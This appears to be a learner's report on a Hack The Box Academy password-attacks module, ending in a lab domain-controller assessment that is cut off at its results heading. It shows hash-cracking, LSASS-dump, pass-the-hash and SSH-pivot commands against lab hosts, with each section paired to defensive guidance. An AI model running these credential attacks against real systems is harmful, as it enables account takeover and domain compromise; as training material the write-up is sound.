> **Migration provenance note (2026-11-02):** The retained source reports carry the date 2026-11-03. Their chronology has not been independently verified. These original dates are preserved as source metadata, not confirmed execution dates.

**Platform:** Hack The Box Academy  
**Module:** Password Attacks  
**Module ID:** 90  
**Difficulty:** Medium  
**Coverage:** 26 of 26 sections  
**Official module:** https://academy.hackthebox.com/app/module/90  
**Assessment section:** https://academy.hackthebox.com/app/module/90/section/1559  
**Documented:** 2026-11-03  
**Author:** NERO.SEC  
**Evidence classification:** Documented Practice / Learning Notes / Evidence Pending  
**Module completion:** Not independently verified

---

## Executive Summary

This report consolidates the complete 26-section Password Attacks module from Hack The Box Academy into a technical learning record.

The module introduces authentication concepts, password cracking, wordlist construction, protected-file recovery, online authentication attacks, credential storage on Windows and Linux, Active Directory credential extraction, credential hunting, and alternative authentication techniques involving NTLM hashes, Kerberos tickets, and certificates.

The report incorporates practical observations recovered from the learner's conversations, including Hashcat exercises, BitLocker password recovery, Windows SAM investigations, Windows Credential Manager access, Active Directory authentication tests, credential hunting, SMB access, and the final NEXURA assessment.

Results originating from third-party write-ups are explicitly distinguished from the learner's own terminal output.

The strongest verified outcome in the final assessment is successful privileged SMB authentication to the NEXURA domain controller through SSH local port forwarding.

The report is not evidence that every HTB Academy section has been officially marked complete.

## Scope and Evidence Methodology

The documentation follows the original HTB Academy section order.

Each section includes technical concepts, representative laboratory methodology, evidence attribution, and defensive significance.

Four evidence categories are used:

- **Documented Practice:** User-supplied terminal output or screenshots support specific activity.
- **Partial Practice:** Some steps were recorded, but completion or a particular objective remains unverified.
- **Learning Notes:** A section is understood from provided material, without confirmed execution.
- **Reference Only:** The result came from an external write-up rather than a recorded original execution.

Commands with variable names or redacted credentials are documentation examples, not claims that the exact displayed command was executed.

Original screenshots are required before publishing any hands-on outcome as a fully verified case study.

---

## Section 01 — Introduction

**Classification:** Learning Notes

The module begins with authentication fundamentals and the importance of protecting credentials. Authentication establishes an identity, while authorization determines the actions that identity may perform.

Authentication factors include knowledge, possession, inherent characteristics, and contextual factors. Passwords remain a common knowledge-based factor, which makes password storage and reuse important security concerns.

Password attacks can target an online authentication service or an offline representation such as a password hash. Offline attacks can often be performed without interacting repeatedly with the target server; online attacks are constrained by authentication controls, logging, and account lockout policies.

The broader objective of this module is to understand how credentials can be exposed, recovered, and reused across systems.

**Evidence assessment:** No separate practical completion evidence is required for this introductory material.

**Defensive significance:** Strong identity controls combine appropriately designed password policies, multifactor authentication, least privilege, and monitoring.

## Section 02 — Introduction to Password Cracking

**Classification:** Learning Notes

Password cracking attempts to recover candidate passwords from protected values or verify candidate passwords against an authentication mechanism.

A hash is not encrypted plaintext. Hash functions are one-way mathematical transformations, although weak password choices can be recovered through candidate generation and comparison.

Password cracking techniques include dictionary attacks, rule-based mutations, mask attacks, hybrid attacks, and exhaustive searches.

The feasibility of offline cracking depends on the hash algorithm, password entropy, salting, key-stretching parameters, and available computing resources.

Common analytical steps include identifying the likely hash format, selecting the correct cracking mode, preparing a candidate source, measuring the search space, and interpreting the outcome.

An example hash-identification workflow is:

```bash
hashid hashes.txt
hashcat --example-hashes
```

**Evidence assessment:** The module's broader cracking workflow is documented, but no standalone Section 02 completion record has been established.

**Defensive significance:** Password storage should employ purpose-built, salted password-hashing algorithms such as Argon2id, scrypt, or suitably configured bcrypt/PBKDF2.

## Section 03 — Introduction to John The Ripper

**Classification:** Documented Practice / Evidence Pending

John the Ripper supports multiple hash and password-protection formats and includes tools for extracting hashes from files.

The learner's recorded module activity included John exercises using wordlists and single-crack-style workflows.

Representative usage:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

John's single mode can generate candidate passwords from information available in account records. Wordlist mode tests known candidate strings, while rules can transform those candidates.

Correct input formatting is essential. A technically valid cracking command may fail to identify a password if the hash format is misidentified or the input is malformed.

The learner also encountered exercises involving username-derived candidate passwords and wordlist-based recovery.

**Observed result:** John-related exercises and answer discussions were recorded. A complete, original section transcript is not available in the current evidence package.

**Evidence Pending:** Original screenshots for the reported results.

**Defensive significance:** Usernames, company names, seasons, and predictable password patterns should not form the basis of authentication secrets.

## Section 04 — Introduction to Hashcat

**Classification:** Documented Practice

Hashcat supports GPU-accelerated and CPU-based password recovery, with attack modes selected according to the candidate-generation strategy.

The learner practiced mode selection, wordlist attacks, and cracking workflows.

A representative NTLM wordlist workflow is:

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt \
  /usr/share/wordlists/rockyou.txt
```

A mask-based workflow uses an attack mode such as `-a 3` and a character mask to describe candidate structures.

Important parameters include:

- `-m`: Hash type.
- `-a`: Attack mode.
- `-r`: Rule file, where applicable.
- `--show`: Display previously recovered candidates.

One recurring difficulty involved preserving literal hash strings when passing them through different shells. Some password-protection hash formats contain dollar signs, which require careful quotation in shell commands.

**Observed result:** The learner supplied Hashcat terminal output for multiple exercises, including later NTLM and BitLocker-related recovery.

**Evidence Pending:** Complete original screenshot manifest for the whole section.

**Defensive significance:** Modern password protections should resist efficient offline guessing even when attackers obtain stored verifier data.

## Section 05 — Writing Custom Wordlists and Rules

**Classification:** Partial Practice / Learning Notes

Generic dictionaries are often insufficient against passwords derived from an organization's naming conventions and common password mutations.

Custom wordlists can incorporate authorized assessment context, such as known account naming patterns, application terminology, and predictable date-related conventions.

Hashcat rules transform base candidates by applying operations such as capitalization, substitution, prefixing, suffixing, and duplication.

Representative rule-based syntax:

```bash
hashcat -m 1000 -a 0 hashes.txt \
  candidates.txt -r custom.rule
```

The important methodological distinction is between the candidate dictionary and the transformation strategy. A small, relevant dictionary with good rules can be more effective than a large, unfocused one.

The learner discussed wordlist and rule usage in the password-cracking exercises, but the available evidence does not establish a complete standalone rule-generation exercise.

**Evidence Pending:** Original custom wordlist, rule file, and verified execution output.

**Defensive significance:** Password policies should reject known compromised candidates and predictable organizational mutations.

## Section 06 — Cracking Protected Files

**Classification:** Documented Practice

Password-protected documents and encrypted virtual disks are potential sources of offline password-verification material.

The learner practiced extracting and processing protected-file hashes and specifically worked through a BitLocker-protected virtual disk exercise.

The recorded environment included a VHD file, a BitLocker hash, Hashcat mode `22100`, and later examination of the protected volume through Linux tooling.

Representative Hashcat invocation:

```bash
hashcat -m 22100 -a 0 bitlocker.hash \
  /usr/share/wordlists/rockyou.txt
```

A recorded Hashcat recovery established a password candidate for the BitLocker exercise. The learner also verified the partition associated with the virtual disk.

However, successful password recovery does not automatically prove the encrypted filesystem was mounted and its final target file recovered.

**Verified observation:** Password-recovery output was supplied by the learner.

**Evidence Pending:** Complete evidence of the subsequent mount and final file inspection.

**Defensive significance:** Disk encryption remains dependent on strong recovery credentials, securely managed keys, and appropriate authentication policies.

## Section 07 — Cracking Protected Archives

**Classification:** Learning Notes / Evidence Pending

Password-protected archives can sometimes be assessed offline after extracting their password-verification material.

John the Ripper provides format-specific utilities for extracting hashes from supported archives.

Representative examples:

```bash
zip2john protected.zip > zip.hash
rar2john protected.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

An archive's protection strength depends on its encryption scheme, password derivation, and password quality.

The presence of an encrypted archive does not establish that its password can be recovered within a practical search budget.

The available conversation evidence does not support claiming that every archive exercise was completed.

**Evidence Pending:** Original archive-processing logs and recovery verification.

**Defensive significance:** Sensitive archives should use modern encryption and independently generated, high-entropy passwords.

## Section 08 — Network Services

**Classification:** Documented Practice / Partial Verification

The network-services section focuses on authentication surfaces exposed by common remote-access and file-sharing protocols.

The learner encountered SMB, SSH, RDP, and WinRM authentication tasks.

Representative authorized service checks include:

```bash
nmap -sT -sV -p 22,445,3389,5985 TARGET
```

SMB may expose shared resources, while SSH and WinRM can provide shell access if authorized credentials are valid.

The recorded learning process included examining command compatibility between Windows CMD, Windows PowerShell, and Linux-based Pwnbox sessions.

Several exercise flags and account credentials were obtained from public write-ups, while at least part of the remote-login activity was performed interactively.

Accordingly, it would be inaccurate to describe every answer as directly verified.

**Evidence assessment:** Partial original practice with additional reference-derived results.

**Defensive significance:** Restrict remote authentication surfaces, enforce MFA where supported, and monitor unusual network logons.

## Section 09 — Spraying, Stuffing, and Defaults

**Classification:** Learning Notes / Partial Practice

Password spraying attempts a small number of candidate passwords across many accounts.

Credential stuffing uses previously exposed username/password pairs against other applications.

Default-password attacks test credentials known to accompany vendor products or administrative deployments.

These techniques differ from exhaustive brute-force attacks, which usually test many candidates against fewer accounts.

A defensive assessment should first examine authentication policy, rate limiting, account lockout thresholds, and service authorization.

The learner discussed authentication attempts and domain password policies, including an observed Active Directory lockout configuration in a related exercise.

There is insufficient first-party evidence to classify the entire spraying section as independently completed.

**Evidence Pending:** Complete spray configuration, permitted scope, and original authentication results.

**Defensive significance:** MFA, password uniqueness, breached-password screening, lockout protections, and authentication telemetry reduce exposure.

## Section 10 — Windows Authentication Process

**Classification:** Learning Notes

Windows authentication involves components such as the Local Security Authority, Security Account Manager, LSASS, NTLM, Kerberos, and credential providers.

Local authentication and domain authentication use related but distinct credential stores.

Local user accounts may be represented in the SAM database, while Active Directory identities are managed through domain services.

Kerberos commonly uses ticket-based authentication. NTLM uses challenge-response authentication and can enable pass-the-hash scenarios when reusable NT hash material is compromised.

The learner studied the relationship between Windows authentication processes and later credential-access exercises.

No standalone execution result for this conceptual section is required to support the theoretical discussion.

**Defensive significance:** Protect credential material, enable modern authentication protections, and minimize unnecessary exposure of privileged credentials.

## Section 11 — Attacking SAM, SYSTEM, and SECURITY

**Classification:** Documented Practice

The SAM registry hive stores local account password-verification material.

The SYSTEM hive can provide key material needed to interpret protected local credential information. The SECURITY hive contains additional LSA-related security data.

The learner investigated a Windows lab host with a local account whose NTLM hash was recovered through a SAM-focused exercise.

A critical learning point was differentiating the NT hash belonging to a specific local user from a familiar hash value associated with an empty password.

Representative examination utilities included NetExec and Impacket.

**Observed outcome:** The learner supplied authentication and SAM-related outputs. A local account's NT hash was identified in the exercise.

**Limitation:** Local SAM extraction is not equivalent to dumping a domain controller's `NTDS.dit`.

**Evidence Pending:** Complete, reviewed screenshots for the section.

**Defensive significance:** Protect administrative access to endpoints, reduce local administrator reuse, and monitor suspicious access to credential hives.

## Section 12 — Attacking LSASS

**Classification:** Partial Practice / Learning Notes

LSASS participates in Windows authentication and may retain credential-related material for active logon sessions.

Attackers with sufficient privileges may attempt to read LSASS process memory.

The learner studied memory-dump analysis using tools such as Pypykatz and Mimikatz.

A representative offline-analysis command is:

```bash
pypykatz lsa minidump lsass.dmp
```

A successful dump file creation does not by itself demonstrate successful password or hash extraction.

Some answers previously discussed for this section originated from third-party sources and should not be presented as first-party learner evidence.

**Evidence assessment:** Technical method documented; original full extraction transcript not confirmed in the available evidence.

**Defensive significance:** Enable appropriate LSASS protections, Credential Guard where supported, and alerts for unauthorized process-memory access.

## Section 13 — Attacking Windows Credential Manager

**Classification:** Documented Practice

Windows Credential Manager stores credentials that may be protected using DPAPI.

Credential entries can be associated with network resources, websites, and applications.

The learner practiced inspecting stored credentials and investigating a OneDrive-related credential entry.

A representative enumeration command is:

```cmd
cmdkey /list
```

The investigation involved an account context change and direct invocation of Windows credential-management APIs.

A user-supplied PowerShell output confirmed that a credential associated with `onedrive.live.com` could be read from the appropriate security context.

The recovered password is intentionally excluded from this public portfolio draft.

**Observed outcome:** Credential access was verified through original terminal evidence.

**Evidence Pending:** Placement of authentic screenshots beside the original walkthrough.

**Defensive significance:** DPAPI and Credential Manager data must be considered during incident response and privileged-session security reviews.

## Section 14 — Attacking Active Directory and NTDS.dit

**Classification:** Documented Practice

Active Directory stores domain identities and credential-related records in its directory database.

Domain credential access may involve appropriately privileged directory operations, database backup access, or misuse of replication permissions.

The learner practiced Active Directory enumeration, username validation, authentication testing, and NT hash recovery.

One observed exercise involved accounts in the `ILF.local` domain.

The learner identified valid credentials for a domain account using NetExec and subsequently verified a separate NTLM hash through a Hashcat recovery.

Another important lesson was recognizing that accounts requiring Kerberos preauthentication cannot be treated as vulnerable to preauthentication-free AS-REP requests.

**Verified observation:** Original authentication and Hashcat result outputs were supplied.

**Limitation:** The section's observed activity should not be confused with later NEXURA Skills Assessment results.

**Defensive significance:** Restrict replication privileges, monitor unusual directory access, and protect domain controllers from unauthorized administrative connections.

## Section 15 — Credential Hunting in Windows

**Classification:** Documented Practice

Windows credential hunting involves reviewing user-accessible files, saved application settings, scripts, configuration files, and stored credentials.

The learner examined a Windows environment containing work-related files.

The investigation found credential-related information in a spreadsheet and a text file containing an application access code.

The user supplied screenshots supporting specific file-content observations.

These artifacts demonstrated the security impact of storing authentication secrets in ordinary documents.

The secrets and access codes are redacted from the public draft.

**Verified observation:** Original screenshots were supplied for selected findings.

**Evidence Pending:** Complete screenshot recovery and association with each exact finding.

**Defensive significance:** Prevent secrets from being stored in shared documents or source repositories; deploy secure secret-management practices.

## Section 16 — Linux Authentication Process

**Classification:** Reference Only / Learning Notes

Linux account information is commonly represented using `/etc/passwd`, while password hashes are typically stored in `/etc/shadow`.

The format of an entry determines how password-verification material should be interpreted.

John the Ripper can process appropriately formatted Linux authentication records in authorized exercises.

The learner discussed exercises involving multiple local Linux accounts and password recovery.

However, the answer values previously supplied for those exercises came from external write-ups, and original terminal execution was not established in the current evidence package.

**Evidence Pending:** Original authenticated access and successful hash-cracking transcript.

**Defensive significance:** Protect shadow files, limit privileged file access, and use modern password-hashing configurations.

## Section 17 — Credential Hunting in Linux

**Classification:** Reference Only / Learning Notes

Linux credential hunting involves identifying authentication material in configuration files, scripts, command histories, application databases, browser profiles, and SSH-related files.

A methodical investigation should respect permissions and assess the provenance of each discovered secret.

Potential sources include:

```text
/home/*/.bash_history
/home/*/.ssh/
/etc/
/opt/
/var/www/
```

The learner studied a lab involving additional user credentials and application data.

Previously discussed recovered passwords were sourced from public write-ups rather than verified local extraction output.

**Evidence Pending:** Original commands, file provenance, and authentication verification.

**Defensive significance:** Restrict permissions, prevent hardcoded passwords, and rotate credentials after unauthorized disclosure.

## Section 18 — Credential Hunting in Network Traffic

**Classification:** Reference Only

Network packet captures may contain authentication material or other sensitive information when protocols transmit it without adequate protection.

The learner studied the extraction of FTP, SNMP, and application-layer information from packet captures.

Relevant analysis tools include Wireshark and tshark.

Representative packet-analysis commands:

```bash
tshark -r capture.pcapng -q -z conv,tcp
tshark -r capture.pcapng -Y 'ftp || snmp'
```

Previously provided exercise answers included information relating to FTP credentials, an SNMP community string, and a retrieved filename.

Those answer values were sourced from external write-ups. No original PCAP analysis transcript was recovered for this report.

**Evidence Pending:** Authentic PCAP, protocol-filter screenshots, and independently extracted results.

**Defensive significance:** Replace plaintext protocols, enforce encryption, and monitor sensitive data exposure in network traffic.

## Section 19 — Credential Hunting in Network Shares

**Classification:** Documented Practice

SMB shares often contain business documents, scripts, and administrative files that may unintentionally disclose authentication material.

The learner enumerated accessible network shares and investigated a collection of IT and HR documents.

In the recorded exercise, one account's credentials enabled access to an additional share, where a confidential onboarding document disclosed another password.

Representative SMB operations:

```bash
smbclient -L //TARGET -U 'DOMAIN\USER'
smbclient //TARGET/SHARE -U 'DOMAIN\USER'
```

This case demonstrates how one exposed secret can lead to access to additional sensitive resources.

Original evidence included terminal results and screenshots from the share investigation.

**Verified observation:** A sensitive document was retrieved and its contents examined.

**Evidence Pending:** Complete attachment inventory and carefully redacted screenshots.

**Defensive significance:** Audit share permissions, restrict confidential HR data, and scan shared files for exposed secrets.

## Section 20 — Pass the Hash (PtH)

**Classification:** Partial Practice / Reference Corroboration

Pass-the-Hash uses an NT hash as authentication material where NTLM authentication is supported.

Unlike password cracking, this technique does not require recovery of the original plaintext password.

The learner studied Windows network authentication using NTLM material and tools including NetExec, Evil-WinRM, and Windows remote-access clients.

The associated exercise included testing remote access, Windows authentication configuration, and access to files under domain-user contexts.

Several exercise flags and account hashes were obtained from public write-ups. Therefore, the current master report does not claim that all PtH lab objectives were independently executed.

**Evidence Pending:** Complete original connection transcripts and screenshots for each PtH objective.

**Defensive significance:** Reduce NTLM exposure, use privileged account controls, and monitor abnormal administrative network authentication.

## Section 21 — Pass the Ticket from Windows

**Classification:** Reference Only / Learning Notes

Kerberos Pass-the-Ticket uses an existing Kerberos ticket to authenticate without reentering the account's plaintext password.

Windows-focused tools discussed in the module include Rubeus and Mimikatz.

The learner studied ticket enumeration, TGT identification, ticket injection, SMB access, and PowerShell Remoting.

The supplied section question set included using a domain user's ticket to access a file share and a remote Windows session.

Answers previously supplied were taken from a third-party write-up and were not confirmed through a full original session transcript.

**Evidence Pending:** Original ticket enumeration, ticket-injection result, and resource access screenshots.

**Defensive significance:** Protect privileged logon sessions, monitor unusual ticket use, and restrict access to credential material.

## Section 22 — Pass the Ticket from Linux

**Classification:** Reference Only / Learning Notes

Linux systems integrated with Active Directory may use Kerberos keytab files and credential caches.

A keytab can contain long-term authentication keys. A ccache stores Kerberos ticket material associated with a security principal.

The learner studied a section covering SSH authentication, keytab discovery, account switching, privileged access, and SMB access through Kerberos credentials.

Relevant diagnostic commands include:

```bash
klist
klist -k /etc/krb5.keytab
```

The section also covered importing user ticket caches and understanding the authentication identity associated with a machine account.

Previously discussed flag values came from public write-ups, and the necessary original terminal evidence was not recovered.

**Evidence Pending:** Keytab permissions, actual ticket-cache validation, and authenticated SMB resource access.

**Defensive significance:** Protect keytabs and credential caches, restrict filesystem access, and review machine-account privileges.

## Section 23 — Pass the Certificate

**Classification:** Reference Only / Learning Notes

Active Directory environments may support certificate-based authentication through Active Directory Certificate Services.

Improper certificate-template permissions, enrollment configurations, and identity mapping can create alternative paths to authentication.

The learner studied exercises involving a user desktop flag and a domain Administrator desktop flag.

The earlier discussion referenced Shadow Credentials and AD CS-related attack paths.

The two reported flag values were obtained from a public walkthrough rather than a verified hands-on extraction transcript.

**Evidence Pending:** Original certificate enrollment, authentication results, and target-file verification.

**Defensive significance:** Audit AD CS enrollment permissions, certificate mappings, template configurations, and unusual certificate-based logon activity.

## Section 24 — Password Policies

**Classification:** Learning Notes

Password policies influence the feasibility of online guessing and account compromise.

Important controls include password length, banned password lists, authentication throttling, lockout thresholds, password history, and multifactor authentication.

A strict expiration policy alone does not guarantee strong authentication. Poorly designed rotation requirements can encourage predictable password mutations.

During another Active Directory exercise, the learner examined a domain lockout setting. However, this does not establish that the complete Password Policies section was independently completed.

**Evidence Pending:** Section-specific policy enumeration and original assessment output.

**Defensive significance:** Apply contemporary password guidance, enforce MFA where feasible, and monitor account-spraying activity.

## Section 25 — Password Managers

**Classification:** Learning Notes

Password managers reduce password reuse by generating and retaining distinct credentials.

The security of a password manager depends on its cryptographic design, master credential protection, device security, session handling, and administrative controls.

A compromised endpoint or unlocked password vault can still expose credentials even when a password manager is otherwise properly designed.

The learner's broader credential-hunting studies are relevant to this topic, but no complete Password Managers hands-on transcript is available.

**Evidence Pending:** Section-specific laboratory artifacts, if required.

**Defensive significance:** Use reputable password managers with strong vault protection, MFA, endpoint security, and controlled access to shared credentials.

## Section 26 — Skills Assessment: NEXURA


**Platform:** Hack The Box Academy  
**Module:** Password Attacks  
**Learning unit:** Skills Assessment — Password Attacks  
**Date documented:** 2026-11-03  
**Target:** ACADEMY-PWATTCK-SADMZ01 (`10.129.230.32`)  
**Classification:** DOCUMENTED PRACTICE / EVIDENCE PENDING  
**Official course:** https://academy.hackthebox.com/course/preview/password-attacks

### 1. Overview

This case study documents a NEXURA Active Directory skills assessment conducted within an authorized Hack The Box Academy environment.

The immediate assessment objective was to recover the NTLM hash of the NEXURA domain Administrator.

The learner's recorded activity did not successfully complete NTDS extraction. However, it demonstrated several important practical outcomes: SSH access to the DMZ host, internal network discovery, validation of domain-controller reachability, SOCKS pivot troubleshooting, SSH local port forwarding, SMB share enumeration, and successful authentication to DC01 with privileged NTLM material.

The Administrator hash was independently confirmed in a public community write-up. This external reference result is explicitly separated from the learner's actual terminal evidence.

The assessment therefore remains classified as documented practice with pending evidence rather than a fully verified domain-compromise exercise.

### 2. Learning Objectives

- Understand the relationship between a DMZ entry point and an internal Active Directory environment.
- Identify internal interfaces, routing information, and domain-controller DNS records.
- Configure SSH dynamic forwarding and SOCKS-based pivoting.
- Understand the differences between TCP connectivity, SMB negotiation, and successful authentication.
- Troubleshoot ProxyChains and SMB client timeouts.
- Configure SSH local port forwarding to reach an internal SMB service.
- Validate NTLM authentication using Samba SMBClient and NetExec.
- Distinguish privileged authentication from successful credential replication or NTDS extraction.
- Preserve the distinction between original evidence and third-party write-up references.

### 3. Technical Background

#### Active Directory and SMB

Active Directory provides centralized authentication and authorization across Windows domain environments.

The Server Message Block protocol is commonly used for file sharing, administrative shares, and domain resources.

SMB generally operates over TCP port 445.

An open TCP port does not establish that SMB negotiation or authentication has succeeded. A complete test must progress through the protocol negotiation and authentication stages.

#### NTLM Pass-the-Hash

NTLM authentication can permit the use of an account's NT hash without recovering the corresponding plaintext password.

In this assessment, NTLM material associated with the domain account `stom` was used to authenticate to the domain controller.

NetExec's `(Pwn3d!)` indicator reported administrative access for the tested SMB host.

This is a meaningful finding, but it does not independently prove that domain credentials were extracted.

#### SSH Dynamic Forwarding

SSH dynamic forwarding creates a SOCKS proxy on the attack machine.

Example:

```bash
ssh -N -D 127.0.0.1:1080 jbetty@10.129.230.32
```

Compatible TCP tools may be routed through this proxy using ProxyChains.

The forwarding session must remain active.

If the SSH process terminates, the SOCKS listener disappears and dependent connections will fail.

#### SSH Local Port Forwarding

SSH local forwarding maps one local TCP endpoint to one destination through the SSH server.

In the recorded exercise, the mapping was:

`Pwnbox:1445 → DMZ01 → DC01:445`

This provided a simpler way to test SMB than the earlier SOCKS-based approach.

#### NTDS and Domain Credential Extraction

The AD database contains highly sensitive credential material.

DCSync attempts to obtain directory secrets through AD replication interfaces. Other NTDS extraction methods may rely on remote administration and volume-shadow-copy operations.

Successful SMB authentication alone is not sufficient evidence that either method completed.

### 4. Lab Environment

#### Attack Host

- Platform: HTB Pwnbox
- Linux distribution: Parrot OS
- Observed IP address: `10.10.15.97`
- Shells encountered: PowerShell on Linux and Bash
- ProxyChains-ng: 4.17
- NetExec: 1.5.1
- Impacket: 0.12.0
- Other utilities: OpenSSH, netcat, Samba SMBClient, iproute2

#### DMZ01

- Hostname: DMZ01
- Assessment identifier: ACADEMY-PWATTCK-SADMZ01
- Operating system: Ubuntu 20.04.6 LTS
- External interface: `ens160`
- External address: `10.129.230.32/16`
- Internal interface: `ens192`
- Internal address: `172.16.119.13/24`
- SSH account: `jbetty`

#### Active Directory

- Domain: `NEXURA.HTB`
- Domain controller: DC01
- Domain-controller address: `172.16.119.11`
- SMB service: TCP/445
- RPC Endpoint Mapper: TCP/135
- Privileged account tested: `NEXURA\stom`

Full credentials and reusable NTLM hashes are intentionally redacted from the portfolio version.

### 5. Reconnaissance and Initial Investigation

#### 5.1 Initial SSH Access

The learner authenticated to the externally reachable DMZ01 host using the SSH account supplied for the exercise.

```bash
ssh jbetty@10.129.230.32
```

The successful connection displayed an Ubuntu 20.04.6 LTS login banner and provided an interactive shell.

This established an initial authenticated position on the DMZ host.

#### 5.2 Internal Interface Enumeration

The following commands were executed:

```bash
ip -br addr
ip route
```

Observed network interface information:

```text
lo      UNKNOWN  127.0.0.1/8
ens160  UP       10.129.230.32/16
ens192  UP       172.16.119.13/24
```

Observed internal route:

```text
172.16.119.0/24 dev ens192 proto kernel scope link src 172.16.119.13
```

These findings established that DMZ01 had direct connectivity to the internal network.

#### 5.3 Domain Controller Resolution

The learner queried the domain controller's name:

```bash
getent hosts dc01.nexura.htb
```

Observed result:

```text
172.16.119.11 nexura.htb DC01 DC01.nexura.htb
```

The result verified the internal address of the domain controller.

#### 5.4 Direct SMB Reachability

From DMZ01:

```bash
nc -vz -w 5 172.16.119.11 445
```

Observed result:

```text
Connection to 172.16.119.11 445 port [tcp/microsoft-ds] succeeded!
```

This demonstrated TCP connectivity between the DMZ server and the domain controller.

It did not yet prove successful SMB authentication.

**Evidence:** Original terminal text verified. A corresponding screenshot has not been recovered on Kali.

**Evidence Status: PENDING**

### 6. SOCKS Pivot Investigation

#### 6.1 Creating the SOCKS Tunnel

The initial pivot used SSH dynamic forwarding:

```bash
ssh -N -D 127.0.0.1:1080 \
  -o ExitOnForwardFailure=yes \
  jbetty@10.129.230.32
```

ProxyChains was configured with:

```ini
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

This configuration routed compatible TCP client connections through DMZ01.

#### 6.2 Tunnel Termination

An SSH debug log showed successful authentication:

```text
Authenticated to 10.129.230.32 using "password".
Local forwarding listening on 127.0.0.1 port 1080.
```

However, the same session was later interrupted:

```text
^C
Killed by signal 2.
```

After termination, the SOCKS listener was no longer available.

The learner confirmed this with:

```bash
ss -lntp | grep ':1080'
nc -vz -w 3 127.0.0.1 1080
```

Observed failure:

```text
nc: connect to 127.0.0.1 port 1080 (tcp) failed: Connection refused
```

This explained one category of ProxyChains failures.

#### 6.3 Restoring Forwarding

After reopening the SSH tunnel, the learner observed a listening SSH process and a successful SOCKS port check.

A later ProxyChains TCP test returned:

```text
Strict chain ... 127.0.0.1:1080 ... 172.16.119.11:445 ... OK
Connection to 172.16.119.11 445 port [tcp/microsoft-ds] succeeded!
```

At this point, basic network connectivity was restored.

**Evidence:** Authentic screenshot `image(20261102-155951).png` was supplied in the conversation.

The screenshot shows the SSH password prompt and Impacket SMB timeout.

The original screenshot is not currently present in the Kali website workspace.

**Evidence Status: PENDING**

### 7. SMB Negotiation Troubleshooting

#### 7.1 NetExec via ProxyChains

The learner tested SMB authentication using NetExec.

Representative command with authentication material redacted:

```bash
proxychains4 -f "$HOME/proxychains-nexura.conf" \
  netexec smb 172.16.119.11 \
  -u stom \
  -H '<REDACTED_NT_HASH>' \
  -d NEXURA.HTB \
  --no-smbv1 \
  --smb-timeout 25 \
  --timeout 30 \
  -t 1 \
  --debug
```

Observed output included:

```text
Creating SMBv3 connection to 172.16.119.11
Timeout creating SMBv3 connection to 172.16.119.11
```

Earlier tests also reported SMBv1 connection timeouts.

The failures occurred before a successful SMB authentication response was produced.

#### 7.2 Impacket Troubleshooting

The learner attempted Impacket SMB operations through ProxyChains.

An observed failure was:

```text
RemoteOperations failed:
[Errno Connection error (172.16.119.11:445)] timed out
```

The timeout did not demonstrate invalid credentials.

It demonstrated that the attempted operation failed to establish or maintain the required communication.

#### 7.3 Important Interpretation

The investigation established a distinction between three conditions:

1. A working SSH forwarding process.
2. A successful TCP connection to a destination port.
3. A successfully negotiated and authenticated SMB session.

These are separate outcomes.

A successful netcat port check must not be reported as successful SMB authentication.

**Evidence:** Authentic screenshot `image(20261102-160645).png` was supplied in the conversation.

The screenshot records a successful SOCKS TCP test and an unsuccessful Impacket operation.

The source screenshot has not been transferred into the Kali website workspace.

**Evidence Status: PENDING**

### 8. Successful SMB Access Through SSH Local Forwarding

#### 8.1 Dedicated Port Forward

The learner configured a dedicated SSH local port forward:

```bash
ssh -N \
  -L 127.0.0.1:1445:172.16.119.11:445 \
  -o ExitOnForwardFailure=yes \
  jbetty@10.129.230.32
```

This created the following communication path:

```text
HTB Pwnbox
    |
    | 127.0.0.1:1445
    v
SSH Tunnel
    |
    v
DMZ01 (10.129.230.32)
    |
    v
DC01 (172.16.119.11:445)
```

#### 8.2 Verifying the Forwarded Port

The learner ran:

```bash
nc -vz -w 5 127.0.0.1 1445
```

Observed result:

```text
Connection to 127.0.0.1 1445 port [tcp/*] succeeded!
```

This verified that the forwarded TCP endpoint was accessible.

#### 8.3 Samba SMBClient Authentication

The learner tested SMB access through local port 1445:

```bash
smbclient -L //127.0.0.1 \
  -p 1445 \
  -W NEXURA \
  -U 'stom%<REDACTED_NT_HASH>' \
  --pw-nt-hash \
  -m SMB3 \
  -t 20
```

Observed share enumeration:

```text
Sharename   Type   Comment
---------   ----   ------------------
ADMIN$      Disk   Remote Admin
C$          Disk   Default share
IPC$        IPC    Remote IPC
NETLOGON    Disk   Logon server share
SYSVOL      Disk   Logon server share
```

The client also reported:

```text
SMB1 disabled -- no workgroup available
```

This was not an authentication failure.

The listed shares demonstrate that the SMB client completed negotiation and authentication sufficiently to enumerate the available resources.

#### 8.4 Privileged Authentication With NetExec

Next, the learner ran NetExec directly against the forwarded endpoint:

```bash
netexec smb 127.0.0.1 \
  --port 1445 \
  -u stom \
  -H '<REDACTED_NT_HASH>' \
  -d NEXURA.HTB \
  --no-smbv1 \
  --smb-timeout 20 \
  -t 1
```

Observed host information:

```text
SMB 127.0.0.1 1445 DC01
Windows 10 / Server 2019 Build 17763
name: DC01
domain: nexura.htb
signing: True
```

Observed authentication result:

```text
[+] NEXURA.HTB\stom:<REDACTED> (Pwn3d!)
```

This was the strongest verified technical result in the exercise.

The result demonstrates successful NTLM authentication and NetExec's administrative-access indication on DC01.

It does not demonstrate that NTDS extraction was completed.

**Evidence:** Authentic terminal output was supplied directly in the conversation.

A screenshot showing the successful `(Pwn3d!)` result was not supplied.

**Evidence Status: PENDING**

### 9. Assessment Question: Domain Administrator NTLM

#### Objective

The question required the NTLM hash belonging to:

`NEXURA\Administrator`

The learner attempted to recover this value using NTDS-related operations.

An Impacket approach using `-just-dc-user Administrator` did not succeed in the recorded session because of connection timeouts.

#### Independent Reference Verification

A separate public write-up by `jameskaois` contains an NTDS extraction result for the domain Administrator account.

The referenced account has RID 500.

The full NTLM hash was checked against that write-up in this conversation.

For the public portfolio report, the reusable hash is represented in redacted form:

```text
Administrator:500:<LM_HASH>:36e09e1e...b8d6d23:::
```

This is a source-supported reference result, not a locally observed extraction.

It is also distinct from the local Administrator hash associated with JUMP01.

#### Verification Boundary

No supplied terminal output shows a completed NTDS dump on the learner's current instance.

No screenshot establishes that the Administrator hash was extracted locally.

No accepted HTB answer submission was supplied.

Therefore, completion of the NTDS extraction objective remains unverified.

### 10. Results and Verification

